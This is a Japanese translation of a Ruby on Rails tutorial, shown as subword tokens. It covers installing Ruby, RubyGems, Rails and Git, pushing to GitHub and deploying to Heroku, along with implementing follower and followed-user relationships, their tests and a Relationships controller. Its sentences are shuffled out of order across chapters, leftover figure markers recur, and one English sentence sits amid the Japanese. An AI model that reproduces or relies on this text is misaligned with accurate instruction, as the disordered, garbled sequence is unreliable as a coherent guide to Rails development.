▁Ruby を インストール した ら 、 Rails の アプリケーション を実行する ために 必要な 他の ソフトウェア 向け に システム を構成する 必要があります 。
▁self を省略した 結果を リスト \ ref { code : user _ relationships _ method _ test } に示します 。
▁ 通常 、 これは \ emph { gem } の インストール に 関連 します 。 gem とは 自 己 完 結 型 の Ruby コードの パ ッ ケ ー ジ です 。
▁\ ko de { user . relationships } 属性 のテスト 。
▁ バージョン 番号 の 異なる gem 同士 が コ ン フ リ ク ト すること がある ため 、 一 連 の gem を 自 己 完 結 的に まとめ た \ emph { gem set } という もの を作成して バージョン を 使い 分 け る の が 便利です 。
▁ 本書 向け に 、 以下 を実行して \ ko de { railstutorial _ rails _4_0 } という名前の gem set を作成し ておく ことをお勧めします 。
▁ U s ing ▁ / Users / mhartl / . r v m / gem s / ruby - 2 . 0.0 - p 0 ▁with ▁gem set ▁ railstutorial _ rails _4_0
▁( なお 、\ ko de { underscore } と 逆 の 働 き を する \ ko de { camelize } という メソッド もあります 。 これは \ ko de { " ca me l _ case "} を \ ko de { " C am e l C as e "} の よう に変換 します ) ▁ 。
▁self を省略した 結果を リスト \ ref { code : user _ relationships _ association } に示します 。
▁ RVM の詳細については 、 「\ href { http :// s tr and code . com / 20 1 3 / 07 / 11 / ruby - version - ma n age r - r v m - o ver view - for - rails - new b s /}{ Rails 初心者 のための Ruby ▁ V er s ion ▁Ma n age r ▁( RVM ) ▁ の概要 } ▁( 英語 )」 という 記事 を 参 考 に してください
▁\ ko de { followed _ id } でも ユーザーを 特 定 できる ことに 気 付き 、 フォローしているユーザー と フォロワー の 扱 い が 対 称 的 でない ことを よく 考え て み れば 、 もう ゲ ー ム に 勝 った ような ものです 。
▁ RubyGems の インストール
▁ユーザー / リレーションシップ の \ ko de { has _ many } の 関連付け を実装する 。
▁ RubyGems は Ruby の プロジェクト のための パ ッ ケ ー ジ マ ネ ー ジ ャ であり 、 Ruby の パ ッ ケ ー ジ ▁(\ emph { gem }) ▁ として 利用できる 多くの 有 用 な ライブラリ があります 。 Rails も gem として インストール します 。
▁Ruby が インストール され ていれば 、 RubyGems は 簡単に インストール できます 。
▁ これはリスト \ ref { code : relationships _ belongs _ to _ test } で使用されていま した 。
▁\ href { http :// r v m . io / r v m / install /}{ RVM を インストール } して あ れば 、 既に RubyGems も 同時に インストール されている はずです 。
▁ RubyGems が インストール されていない 場合は 、\ href { http :// ruby gem s . org / pages / d own load } { RubyGems を ダウンロード } して 解 凍 し 、 作成された \ ko de { ruby gem s } ディレクトリ で セットアップ プログラム を実行して ください 。
▁ユーザー / リレーションシップ の \ ko de { belongs _ to } 関連付け をテストする 。
▁ 既に RubyGems が インストール されている 場合は 、 システム を チュートリアル で 使われ ている バージョン に 更新 してください 。
▁これ に対応する アプリケーション コード を作成する には 、\ ko de { belongs _ to } リレーションシップ を 普 段 と同様に 作成 します 。
▁Rails は 外部キー を 、 それ に対応する シンボル から 推測 します 。 たとえば 、\ ko de { : follower } から \ ko de { follower _ id } を 推測 し 、\ ko de { : followed } から \ ko de { followed _ id } を 推測 する という 具 合 です 。 しかし 、 Follow ed モデル も Follow er モデル も 実際には ないので 、 クラス名 \ ko de { User } を 提 供 する必要があります 。
▁ システム を 特定の バージョン に 固定 しておけば 、 今後 RubyGems が変更され たとき の コ ン フ リ ク ト を 防止 できます 。
▁ 変更 の 結果を リスト \ ref { code : relationship _ belongs _ to } に示します 。
▁gem を インストール すると 、 RubyGems によって ri と rdoc という 2 種類 の ドキュメント が デフォルトで 作成されます 。 多くの Ruby や Rails の 開発者 は これらの ドキュメント が 自動生成 される 時間 す ら 惜 しい と 考え ます
▁ デフォルトで 作成される Relationship モデルと は 異 なり 、\ ko de { followed _ id } のみ アクセス 可能 と な っている 点に注意 してください 。
▁( ほとんど の プ ログ ラ マ ー は ネ イ テ ィ ブ の ri や rdoc など 参 照 せ ず 、 さ っ さ と オンライン ドキュメント を見 に 行 ってしまいます )。
▁\ ko de { belongs _ to } 関連付けを ▁ Relationship モデル に追加する 。
▁ これはリスト \ ref { code : gem r c } で使用されていま した 。
▁このコードは リスト \ ref { code : relationship _ create _ test } で使用されていま した 。 もうひとつ 、
▁gem 設定 ファイル を作成する 。
▁ 冒 頭 の \ ko de { sub l } は OS ▁X で S ublime ▁Text を 起動 する コマンド です 。 設定 方法 については 「\ href { http :// www . s ublime text . com / doc s / 2 / o s x _ command _ line . html } { OS ▁X ▁ コマンドライン 用 S ublime ▁Text ▁2 ドキュメント } ▁( 英語 )」 を参照してください 。
▁ 使用している プラットフォーム や エディタ が 異なる 場合 、 sub l を 他の エディタ コマンド に 読み 替 え てください ▁( エディタ の ア イ コ ン を ダ ブ ル クリック するか 、\ ko de { ma te }、\ ko de { v im }、\ ko de { g v im }、\ ko de { m v im } などの コマンド に 差 し 替 え ます )。
▁ 記述 を 簡 素 化 する ため 、 本書 で 以後 \ ko de { sub l } と 書かれてい る 箇所 は お 好 み の エディタ に 読み 替 え てください 。
▁\ ko de { . gem r c } に ri と rdoc 生成 を 抑 制 する コマンド を追加する 。
▁ RubyGems を インストール して し ま えば 、 Rails の インストール は 簡単 です 。
▁ いよいよ Relationship 関連付け の 核 心 、\ ko de { followed _ users } と \ ko de { followers } に 取り か か ります 。
▁ 本書 では Rails ▁4.0 を使用します 。 以下 を実行して インストール してください 。
▁self を省略した 結果を リスト \ ref { code : user _ following _ test } に示します 。
▁ 正しく インストール された かどうかを確認 するには 、 以下のコマンドを実行し て バージョン を 確認 してください 。
▁\ ko de { user . followed _ users } 属性 のテスト 。
▁この 記事 の 執 筆 時点 では 、 この バージョン の違い は 影 響 していません 。 ただし 、 今後 Rails のバージョン が 本書 指定 の もの から 離 れ て い く に つ れ 、 バージョン の違い による 影 響 が 顕 著 になる 可能性があります 。
▁ L in u x を実行し ている 場合は 、 この時点で 、 他にも いくつかの パ ッ ケ ー ジ を インストール する必要が 生じる 場合 があります 。
▁ デフォルトの \ ko de { has _ many ▁ through } 関連付け では 、 Rails は 単 一 バージョンの 関連付け に対応する 外部キー を探し ます 。 つまり 以下のコード は
▁\ ko de { relationships } テーブル の \ ko de { followed _ id } を使用して 配列 を作成します 。
▁ どんな Rails アプリケーション も 最初の 作成 手順 は 同じです 。 \ ko de { rails ▁ new } コマンド を実行して 作成 します 。
▁User モデルの \ ko de { followed _ users } 関連付け を追加する 。
▁\ ko de { rails ▁ new } を実行して アプリケーションを 新規作成 する 。
▁( この \ ko de { follow ! } メソッドは 常に 正常に動作し なければなりません 。 従って 、\ ko de { create ! } メソッド や \ ko de { save ! } メソッド と同様 、 末尾 に 感 嘆 符 を 置 いて 、 作成 に 失敗した場合 には 例外を発生 すること を示します ) ▁ 。
▁この アプリケーション コード では 、\ ko de { following ?} メソッドは \ ko de { other _ user } という 1 人のユーザー を 引数に と り 、 フォロー する 相手 の ユーザーが データベース 上 に 存 在 する かどうかをチェックし ます 。 \ ko de { follow ! } メソッドは 、\ ko de { relationships } 関連付け を経由して \ ko de { create ! } を呼び出す ことで 、「 フォロー する 」 の リレーションシップ を作成します 。
▁ 変更 の 結果を リスト \ ref { code : following _ p _ follow _ b an g } に示します 。
▁ 以下 は 、 上 と 同 等 のコード です 。
▁\ ko de { self } を 明示的に 書く かどうか は 好 み の 問題 です 。
▁ユーザー は 他の ユーザーを フォロー できる だけで なく 、 フォロー解除 も できる 必要があります 。 O f ▁c our s e , ▁ users ▁ sh o ul d ▁be ▁ able ▁to ▁ unfollow ▁ other ▁ users ▁as ▁we ll ▁as ▁ follow ▁the m , ▁ w h i ch ▁ le ad s ▁to ▁the ▁ some what ▁ pre d i c table ▁\ ko de { unfollow ! }
▁ U s e ▁` bundle ▁ show ▁[ gem name ] ` ▁to ▁ s e e ▁ where ▁a ▁bundle d ▁gem ▁is ▁install ed .
▁self を省略した 結果を リスト \ ref { code : user _ unfollow _ test } に示します 。
▁ユーザーの フォロー解除 をテストする 。
▁ユーザーの リレーションシップ を削除し て フォロー解除 する 。
▁ リレーションシップ という パ ズ ル の 最後の 一 片 は 、\ ko de { user . followers } メソッド を追加する ことです 。 これは 上の \ ko de { user . followed _ users } メソッドと 対 になります 。
▁ 実は 、\ ko de { follower _ id } と \ ko de { followed _ id } を 入 れ 替 え る だけで 、 フォロワー についても ユーザーの フォロー のとき と まったく 同じ 方法 が 使用できます 。
▁{0} 図 11 .9{/0} {1} Relationship モデルの カラム を 入 れ 替 え て 作 った 、 フォロワー の モデル 。 {/1}
▁ 逆 リレーションシップ をテストする 。
▁\ ref { sec : the _ first _ application } でも 簡単に 説明したように 、 Bundler は \ ko de { rails } によって自動的に 実行 ▁( この場合は \ ko de { bundle ▁install }) ▁ されます 。 ここでは デフォルトの アプリケーション gem を変更 して Bundler を 再度 実行 してみます 。
▁\ ko de { subject } メソッドを使用して \ ko de {@ user } から \ ko de { other _ user } に 対象 を 切り 替 え ている ことで 、 フォロワー の リレーションシップ のテスト を 自 然 に 実行 でき ていることに注目してください 。
▁その ために まず 、 好 み の エディタ で \ ko de { Gemfile } を 開 きます 。
▁もちろん 、 逆 リレーションシップ のために わざわざ データベース テーブル を 1 つ 余 分 に 作成する ようなこと は しません 。
▁ 代わりに 、 フォロワー と フォローしているユーザー の関係 が 対 称 的 であることを 利用 し 、 単 に \ ko de { followed _ id } を 主キー として 渡す ことで \ ko de { reverse _ relationships } を シ ミ ュ レ ート すれば よい のです 。
▁\ ko de { first _ app } ディレクトリ 直 下 にある デフォルトの \ ko de { Gemfile } 。
▁つまり 、 この \ ko de { relationships } 関連付け では 以下のように \ ko de { follower _ id } を 外部キー として 使用 し 、
▁\ ko de { reverse _ relationships } では 以下のように \ ko de { followed _ id } を 外部キー として 使用します 。
▁self を省略した 結果を リスト \ ref { code : user _ reverse _ relationships } に示します 。
▁ 逆 リレーションシップ を使用して \ ko de { user . followers } を実装する 。
▁ 実際には 、 この 関連付け では 以下のように \ emph { クラス } 名を 明示的に 含 め る 必要がある ことに注意してください 。
▁ これを 指定 しない と 、 Rails は 実 在 しない \ ko de { Re ver s e Relationship } クラス を探し に 行 ってしまいます 。
▁ここでは 、 以下のように \ ko de { : source } キー を省略 しても よい ことに も 注意 してください 。
▁\ ko de { : followers } 属性 の場合 、 Rails が ▁“ followers ” ▁ を 単数形 に して 自動的に 外部キー \ ko de { follower _ id } を探し てくれる からです ▁( : followed では こう は い き ません )。
▁上のコードでは 、 関連付け が \ ko de { has _ many ▁: followed _ users } と同じ 形式 になる ことを 強 調 するために 、 あえて \ ko de { : source } キー を 付け て あります が 、 もちろん 省略 しても 構 いません 。
▁ この節 は 、 データ モデリング の ス キ ル を 向 上 させる という 強 い 要 請 に基いて 書かれ ました 。 時間 を かけ て 身 に 付け ていた だけ れば 幸 い です 。
▁ この節 で 使用 された さまざまな 関連付け を理解する の に 一 番 良い のは 、 次の 節 で 行 な っている ように 実際の Web インターフェイス で使用する ことです 。
▁# ▁gem ▁' c api s tr an o ', ▁ group : ▁: development
▁\ ko de { gem } ▁ コマンドで 特定の バージョン 番号 を 指定 しない 限 り 、 Bundler は自動的に 最 新 バージョンの gem を取得し て インストール してくれます 。
▁1 つ 前 の 章 のとき と同じ ように 、 サンプルデータ を 自動 作成する Rake タスク を使用して データベースに サンプル リレーションシップ を 登録 する の が や は り 便利です 。
▁( 2 . 0.0 以外の バージョンの Ruby を使用する場合 は 、 Ruby のバージョン を 書き 換 え てください )。
▁ 更新 された \ ko de { Gemfile } では 、 J Query に関する 以下の行 も 変更 します 。 J Query は Rails の デフォルトの JavaScript ライブラリ です 。
▁ 他にも 変更 を行います 。
▁ ma ke _ users
▁ ma ke _ microposts
▁ ma ke _ relationships
▁この 手順 が 必要となる のは 、 Rails ▁gem のバージョン を変更 した 場合に 限 られます 。 おそらく Rails イン スト ー ラ を 使用している 場合に しか こう い う ことは 起 こ らない でしょう 。 他の 場合に この 手順 を実行して も 大 丈 夫 です 。
▁上のコード のうち 、 サンプル リレーションシップ を作成する 部分 は 以下 です 。
▁ここでは 、 最初の ユーザーに ユーザー 3 から ユーザー 5 1 まで を フォロー させ 、 それ から 逆 に ユーザー 4 から ユーザー 4 1 に 最初の ユーザーを フォロー させ ます 。 ソース を見ると わかるように 、 このような 設定 を 自由に 行う ことができます 。
▁ { p 0} の {2} rails ▁ new {/2} コマンド と \ ref { sec : the _ first _ application } の {2} bundle ▁install {/2} コマンド を実行し た ことにより 、 実際に 動か す こと の できる アプリケーション が作成され ました 。
▁ う れ しい ことに 、 Rails には 開発 マ シ ン から のみ ブ ラ ウ ズ できる \ emph { ローカル } Web サーバ を 起動 させる ための コマンドライン プログラム ▁(\ emph { スクリプト }) ▁ が 付 属 している ので 、 以下の コマンド を実行する だけで 簡単に 起動 することができます
▁これで サンプル ユーザーに 、 フォローしているユーザー の配列 と フォロワー の配列 が できました 。 ユーザー プロファイル ページ と Home ページ を更新し て これを 反 映 しましょう 。
▁=> ▁C all ▁with ▁- d ▁to ▁ de t a ch
▁次に 、 フォロー 用 と フォロー解除 用の フォーム を作成します 。 それ から 、 フォローしているユーザー と フォロワー の 一覧 を表示する 専 用の ページ を作成します 。
▁( JavaScript ラ ン タ イ ム が インストール されていない という エラーが表示され た場合 は 、\ href { https :// github . com / s st e ph en s on / ex ec js } { GitHub の ex ec js ページ } にある インストール 可能な ラ ン タ イ ム を 確認 してください 。
▁\ href { http :// no de js . org /}{ No de . js } が 特に お勧め です 。 )
▁ 通常 、 Web サイト は 8 0 番 ポート で 受信 待 ち します が 、 この ポート を使用する には 特別な 権限 が 必要 になる こと が多い ので 、 Rails の 開発 用 サーバー では 制限 の 少 ない 、 番号 の 大 き い ポート ▁( い わ ゆ る ハ イ ナ ン バー ポート ) ▁ を使用します 。
▁この I P アドレス は 、 この マ シ ン に 設定 されている すべての I P アドレス で 受信 待 ち ▁( list en ) ▁ する ように 指定 しています 。 これにより 、\ ko de { 1 27 . 0.0 . 1 } ( \ ko de { localhost }) という 特別な アドレス で アプリケーションを ブ ラ ウ ズ できます 。
▁この 最初の アプリケーションの 情報を 見 る には 、「 About ▁your ▁ application ’ s ▁ environment 」 の リンクを クリック してください 。
▁ テスト の 結果を 図 \ ref { fig : r id ing _ rails _ environment } に示します 。
▁ どちら の ページ も データ を表示する もの なので 、 ( REST の 慣習 に基いて ) ▁\ ko de { GET } リクエスト に応答する ために \ text tt { get } を使用して URL を生成します 。 \ text tt { member } メソッドは 、 ユーザー id を含む URL に その ルート ▁( route ) ▁ が 応答 できるように する ものです 。
▁\ ref { sec : rails _ routes } では この デフォルト ページ を削除し 、 カスタマイズ した ホ ー ム ページ に置き換え る 予定です 。
▁ ルーティング が 定義された ことで 、 統 計 情報 パーシャル を テスト できる 状態 に なりました
▁ 新しく 動作する Rails アプリ が 完成 した ところで 、 さ っ そ く アプリケーションの ソースコード を \ emph { バージョン管理 } 下 に置き ましょう 。 これを 行 わ ない と アプリケーション が 動か ない ということ ではありません が 、 ほとんど の Rails 開発者 は バージョン管理 は 開発 現 場 において 必要 不 可 欠 である と 考え ています 。
▁( 最初に テストを 書い ても よ か った のですが 、 ルーティング を更新し て お か ない と 名前付きルート の 説明 が し に く か った ので 、 テストを 後に しました ) ▁ 。
▁ Home ページ 上の 、 フォローしているユーザー / フォロワー の 統 計 情報 をテストする 。
▁ バージョン管理 システム を 熟 知 すること は 、 今 や あらゆる ソフトウェア 開発者 にとって 必 須 の ス キ ル である と 言 って よいでしょう 。
▁ Git ▁( という より バージョン管理 ) ▁ は それ だけで 大きな テ ー マ なので 、 すべて を 説明 し よう と すると 軽 く 一 冊 の 本 を 超 え てしまいます 。 本書 では 簡単に 言 及 する に と ど め ます が 、 幸 い ネ ッ ト 上 には 無 償 で 利用できる リソース が あ ふ れ ています 。 その 中 でも 特に 「\ href { http :// git - sc m . com / book }{\ emph { Pro ▁ Git } }」 S co tt ▁C ha con ▁( A pre s s , ▁ 200 9 ) ▁ を お勧め いた します ▁( 訳 注 : ▁ Pro ▁ Git には 素晴らしい 日 本 語 版 があります : ▁ http :// git - sc m . com / book / j a / ▁ )。
▁end
▁( リンク 先 の 節 でも 述 べ ている ように 、\ href { http :// git - sc m . com / book / en / getting - started - install ing - git }{\ emph { Pro ▁ Git } の 「 Git の インストール }」 の 記 載 に従う ことになります )。
▁ Git の インストール 後 、 最初に 1 回 だけ 行う 必要 のある 設定 があります 。
▁この テスト の 中 心 となる のは 、 フォローしているユーザー と フォロワー の カウント が ページに 表示 され 、 それぞれ に 正しい URL が 設定 されている ことを確認する ことです 。
▁ 著者 の場合 、\ ko de { checkout } ▁という 長 った ら しい コマンド の代わりに \ ko de { co } という 短 い コマンド ▁( エイリアス ) ▁ も 使えるように しています 。 これ を行う には 以下 を実行します 。
▁ 本書 では 、\ ko de { co } エイリアス を 設定 していない システム でも 動作する ように フル ス ペ ル の \ ko de { checkout } を使用しています が 、 著者 自身 は 実際の 開発 では ほとんど い つ も \ ko de { git ▁ co } を使って プロジェクト を チェック ア ウ ト しています 。
▁また 、 ここでは ▁“ followers ” ▁という 語 は \ emph { ラ ベ ル } として 使用している ので 、 フォロワー が 1 人 の場合 にも 複数形 の ま ま とします 。
▁self を省略した 結果を リスト \ ref { code : st at s _ partial } に示します 。
▁今度は 、\ emph { リポジトリ } を作成する たびに 必要な 作業 を行います 。
▁ In it i al ize d ▁ empty ▁ Git ▁ re p o s it or y ▁in ▁ / Users / mhartl / rails _ projects / first _ app / . git /
▁次に 、 プロジェクト の ファイルを リポジトリ に追加します 。
▁ 実行 結果を 図 \ ref { fig : home _ page _ follow _ st at s } に示します 。
▁この コマンド により 、 プロジェクト の ファイルは 、 コミット 待 ち の 変更 が 格 納 されている 「\ emph { ス テ ー ジ ング エ リ ア }」 という 一 種 の 待 機 場所 に追加 されます 。 ス テ ー ジ ング エ リ ア にある ファイルの リスト を表示する には 、\ ko de { status } コマンド を実行します
▁{0} 図 11 . 11 {/0} {1} Home ページ ▁(\ href { http :// localhost :3000/ }{/ }) ▁ に フォロー 関連 の 統 計 情報 を表示する 。 \ href { http :// railstutorial . org / images / figure s / home _ page _ follow _ st at s _ bootstrap - full . png }{( 拡大 ) }{/1}
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁この 点 については 、 もう 一 つの 有 名 な オープン ソース バージョン管理 システム である S ub version とは は っ き り 異なります 。
▁ Git の場合 、 コミット を実行して も リモート 上 にある リポジトリ を直接 変更 する ことはありません 。 Git では 、 ローカル で の 変更 保存 ▁(\ ko de { git ▁ commit }) ▁ と 、 リモート 上の リポジトリ への 変更 反 映 ▁(\ ko de { git ▁ push }) ▁ の 2 段 階 に 分 か れ ています 。
▁ Date : ▁ T h u ▁ O ct ▁ 15 ▁ 11 : 3 6 : 2 1 ▁ 200 9 ▁- 07 00
▁\ ko de { git ▁ log } を 終 了 するには \ ko de { q } キー を 押 してください 。
▁ 今 の 時点 では 、 ソースコード を バージョン管理 下 に 置 か なければならない 理由 が 今 ひとつ よく わ から ない という 方が いる かもしれません ので 、 例 を 1 つ 紹 介 します
▁( この後 の 章 でも 多くの 実 例 を 紹 介 します )。
▁この 「 隠 れ た 」 \ ko de { input } タグ は 、 関連する 情報を ページ に置き ながら 、 それら を ブラウザ 上で 非 表示 に します 。
▁ 仮 に 、 あなた が 重要な \ ko de { app / controllers / } ディレクトリ を削除し て し ま った と しましょう 。
▁ここでは 、 Unix コマンド の \ ko de { l s } で \ ko de { app / controllers / } ディレクトリ の 中 身 を表示し た 後 、\ ko de { rm } コマンド を う っかり 実行 して この ディレクトリ を削除し てしまい ました 。
▁ 現在の 状態 を 確認 してみましょう 。
▁つまり 、 以前の コミット を \ ko de { checkout } コマンド ▁( と 、 現在 まで の 変更を 強 制 的に 上 書き して 元に戻す ための \ ko de { - f } フラグ ) ▁ で チェック ア ウ ト すれば 、 簡単に 削除 前 の 状態 に 戻 す ことができます 。
▁{0} 図 11 . 12 {/0} {1} ある ユーザー プロファイル ▁(\ href { http :// localhost :3000/ users / 2 }{/ users / 2 }) ▁ に ▁[ Follow ] ▁ ボタン が表示されている 。 ▁\ href { http :// railstutorial . org / images / figure s / profile _ follow _ button _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ 削除 された ディレクトリ と ファイルが 無 事 復 旧 しました 。
▁{0} 図 11 . 1 3 {/0} {1} ある ユーザー プロファイル ▁(\ href { http :// localhost :3000/ users / 8 }{/ users / 6 }) ▁ に ▁[ U n follow ] ▁ ボタン が表示されている 。 \ href { http :// railstutorial . org / images / figure s / profile _ unfollow _ button _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ Git を使用して プロジェクト を バージョン管理 下 に置く ことができ たので 、 今度は \ href { http :// github . com } { GitHub } に ソースコード を アップロード してみましょう 。 GitHub は 、 Git リポジトリ の 置き場所 を 提供し たり ▁( ホ ス テ ィ ング ) 、 リポジトリ を 開発者 同士 で 共有 する サービス を 提供し たり する Web サービス として 有 名 です 。
▁ フォローしているユーザー を表示する ページ と 、 フォロワー を表示する ページ は 、 いずれ も ユーザー プロファイル ページ と ユーザー インデックス ページ ▁(\ ref { sec : user _ index }) ▁ を 合わせ た ような 作り になる という 点 で 似 ています 。 どちら にも フォロー の 統 計 情報 などの ユーザー情報 を表示する サイドバー と 、 ユーザーの リスト があります 。
▁ リポジトリ を GitHub に わざわざ プッシュ するのに は 2 つの 理由 があります 。 1 つ 目 は 、 ソースコード ▁( と その すべての 変更 履 歴 ) ▁ の 完全な バ ッ ク アップ を作成する ことです 。 2 つ 目 は 、 他の 開発者 と の 共 同 作業 を より 簡単に 行う ことです 。
▁さらに 、 サイドバー には ユーザー プロファイル 画像 の リンクを 格 子 状 に 並 べ て 表示する 予定です 。
▁ GitHub への プッシュ は 必 須 ではありません が 、 GitHub の メンバ ー になっ ておく と 、 多くの オープン ソース プロジェクト に 参 加 できるようになります 。
▁ GitHub には さまざまな 有 料 プ ラ ン があります が 、 オープン ソース のコード なら 無料 で 利用できる ので 、 初めて 利用 する のであれば \ href { https :// github . com / signup / free } { 無料 の GitHub アカウント } を作成し ましょう
▁{0} 図 11 . 14 {/0} {1} フォローしているユーザー 用 ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / following _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁( 念 の ため 、\ href { http :// help . github . com / key - setup - redirect } { GitHub の S S H キー 作成 方法 の チュートリアル } を 先に 読んで おいてください )。
▁{0} 図 11 . 15 {/0} {1} ユーザーの フォロワー 用 ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / followers _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁( 注意 : ▁このとき に \ emph { README } ファイル を使用して リポジトリ を 初期化 \ ko de { しないでください } ▁ 。 \ emph { rails ▁ new } コマンド を実行する ときに これらの ファイル は自動的に 作成される からです ) ▁ 。
▁ リポジトリ を作成し たら 、 以下 を実行して アプリケーションを プッシュ します 。
▁ これはリスト \ ref { code : following _ followers _ author i z ation _ test } で使用されていま した 。
▁ 最初の コマンド は 、 現在の メ イン ▁(\ emph { master }) ▁ ブランチ 用の ▁" origin " ▁ として GitHub に追加します 。 次の コマンドで 実際に ▁ GitHub に プッシュ します
▁(\ text tt { - u } フラグ については 気 に する必要はありません 。 気 になる のであれば ▁" git ▁ set ▁ up st re am " で 検索 してみてください )。
▁ .
▁なお 、 GitHub には コマンドライン インターフェイス を 拡 張 した G U I アプリケーション もあります 。 ▁ G U I アプリケーションの 方が 好 み であれば 、\ href { http :// w in do w s . github . com /}{ GitHub ▁for ▁ Windows } や \ href { http :// ma c . github . com /}{ GitHub ▁for ▁ Mac } を チェック してみてください
▁( L in u x 用の GitHub は 今 の ところ Git しか ない よう です )。
▁S ig n ▁in
▁\ ko de { README } ファイルの 拡張子 は \ ko de { . rdoc } になっている ので 、 GitHub では 適切な フォーマット で 表示 されます 。 しかし その 内容 は Rails フレームワーク そのもの に関する もの で 、 そのまま では 役 に 立 ち ません 。 この節 では README の内容 を 編集 し 、 プロジェクト に関する 記述 に置き換え ます 。
▁\ ko de { followed _ users } ページ と \ ko de { followers } ページ をテストする 。
▁ それぞれの アクション では 、 タイトル を 設定 し 、 ユーザーを 検索 し 、\ ko de {@ user . followed _ users } または \ ko de {@ user . followers } から データ を取り出し 、 ページネーション を 行 な って 、 ページ を出力する 必要があります 。
▁ ちなみに 、 通常 このような 小さな 変更 のために わざわざ ブランチ を作成する 必要はありません が 、 ブランチ が よい 習慣 であること に 変 わ り は ないので 、 少し でも 練 習 しておきましょう 。
▁ 著者 の場合 、 デフォルトの R D o c を 編集 するときに は 主 に \ href { http :// d ar ing fi re b all . net / projects / m ar k d own /}{ M ar k d own } という マークアップ 言語 を使用しています 。 拡張子 を \ ko de { . m d } に しておけば 、 GitHub に アップロード したときに 自動的に ドキュメント が き れ い に 整 形 されます 。
▁# ▁Ruby ▁on ▁Rails ▁ チュートリアル : サンプルアプリケーション
▁This ▁is ▁the ▁ first ▁ application ▁for ▁the
▁ by ▁[ Michael ▁Hartl ]( http :// michael hartl . com / ).
▁これらの アクション では 、\ emph { render } を \ ko de { 明示的に } 呼び出し ている ことに注意してください 。 ここでは 、 作成 の 必要な \ emph { show _ follow } という ビュー を 出力 しています 。
▁\ ko de { - a } フラグ は 慎 重 に 扱 って ください 。 最後の コミット 後に 新しい ファイル を追加した 場合は 、 まず \ ko de { git ▁ add } を実行して バージョン管理 下 に置く 必要があります 。
▁ コミット メッセージ は \ emph { 現在 形 } で 書く ように しましょう 。
▁詳細については GitHub に 投 稿 された 「\ href { https :// github . com / blog / 9 2 6 - sh in y - new - commit - style s } { 最新の コミット 方法 } ▁( 英語 )」 を参照してください 。
▁{0} 図 11 . 16 {/0} {1} 現在のユーザー に フォロー されている ユーザー を表示する 。 \ href { http :// railstutorial . org / images / figure s / user _ following _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 11 . 17 {/0} {1} 現在のユーザー の フォロワー を表示する 。 \ href { http :// railstutorial . org / images / figure s / user _ followers _ bootstrap - full . png }{( 拡大 ) }{/1}
▁これらの ボタン のテスト には 、 本書 で 扱 った さまざまな テスティング の 技 法 が 集 約 されています 。 この テストコード を 読 む のは よい 練 習 になります 。
▁この 点 については この後 で カ バー します )。
▁ このコード における \ ko de { ha ve _ x path } メソッドの 使用 法 に 注目してください 。 ▁これは 、\ href { http :// en . w ikipedia . org / wiki / X P a th } { X P a th } を使用して HTML 5 を含む XML ドキュメント を 自 在 に ナ ビ ゲ ート すること の できる 、 極めて 高 度 かつ パ ワ フル な テクニック です 。
▁Web 検索 で X P a th を使用する 方法 の詳細については \ href { http :// www . w 3 s ch o ol s . com / x path / x path _ s y n t a x . as p } { X P a th 構 文 } ▁( 英語 ) ▁ を参照してください 。
▁ Follow / U n follow ボタン をテストする 。
▁end
▁\ ko de { README } ファイルの 更新 が 終わっ たので 、 GitHub に変更 を プッシュ して 結果 を見てみましょう 。
▁ 既に \ ref { sec : github } で 一度 プッシュ を 行った ので 、 大 抵 の システム では \ ko de { git ▁ push } を実行する ときに \ ko de { origin ▁ master } を省略 できます 。
▁この 段 階 では 空 っ ぽ の Rails アプリケーション しか ありません が 、 本番環境 に 展開 し てしまい ましょう 。
▁この 実装 を 書く には 、 正しい 動作 を より 深 く 理解 する必要があります 。 フォロー すること と フォロー解除 すること は 、 それぞれ リレーションシップ を \ emph { 作成 } すること と \ emph { 削除 } することです 。 これは つまり 、 Relationship s コントローラ で \ ko de { create } アクション と \ ko de { destroy } を定義する ということ であり 、 この コントローラ を 作成する必要があります 。
▁( これ が 上で 述 べ た セキュリティ ホ ー ル です ) ▁ 。
▁ Relationship s コントローラの 認 可 をテストする 。
▁Ruby のバージョン を明示的に指定 した \ ko de { Gemfile } 。
▁ すぐ 削除 される ので 事 実 上 意味 の ない Relationship オブジェクトを わざわざ 作成 すること による オ ー バー ヘ ッ ド を 回 避 するために 、\ ko de { delete } テストでは 名前付きルート に id ▁\ ko de {1} を ハ ー ド コード して あります 。
▁ インストール の 際に は 、\ ko de { bundle ▁install } に 特殊な フラグ を追加します 。
▁ ユーザーが リダイレクト された 後 で 、 アプリケーション が この id で リレーションシップ を 取り出す ので 、 このコード は 動作します 。
▁上の テストにパス するための 以下の コントローラ のコードは 、 驚 く ほど 簡潔 です 。 単 に 、 フォローしているユーザー または これ から フォロー する ユーザー を取り出し 、 関連する ユ ー テ ィ リ テ ィ メソッドを使用して それら を フォロー または フォロー解除 している だけです 。
▁ 上で 追加 した gem は 本番環境 のみ で使用する ための もの なので 、 この コマンド を 今 実行 しても gem は ローカル に追加 されません 。 この コマンド を実行する のは 、 後 の 本番環境 に 備 え て \ ko de { Gemfile . lock } を更新し 、\ text tt { p g } ▁gem と \ text tt { rails _ 12 factor } ▁gem 、 Ruby バージョンの 指定 を含め ておく 必要がある ためです 。
▁この すべて を 実装 した 結果を 、 リスト \ ref { code : relationships _ controller } に示します 。
▁最初に \ href { http :// api . heroku . com / signup } { Heroku の ユーザー登録 } を行います 。 アカウント 作成 後に 完了 通知 メール が 届 い たら 、\ href { https :// to ol b e lt . heroku . com /}{ Heroku ▁ To ol b e lt } を使用して 必要な Heroku ソフトウェア を インストール します
▁次に ターミナル で 以下の \ ko de { heroku } コマンド を実行します ▁( 実行 前に ターミナル の 終 了 と 再 起動 が 必要な ことがあります )。
▁これで 、 フォロー / フォロー解除 の 機能 が 完成 しました 。 どの ユーザー も 、 他の ユーザーを フォロー したり 、 フォロー解除 したり できます 。 サンプルアプリケーション を 実際に 動か して み たり 、 以下のように テストスイート を実行する ことで 動作 を 確認 できます 。
▁つまり 、 ユーザー は プロファイル ページを 最初に 表示 し 、 それ から ユーザーを フォロー し 、 その後 すぐ 元の ページに リダイレクト される という 流れ になります 。
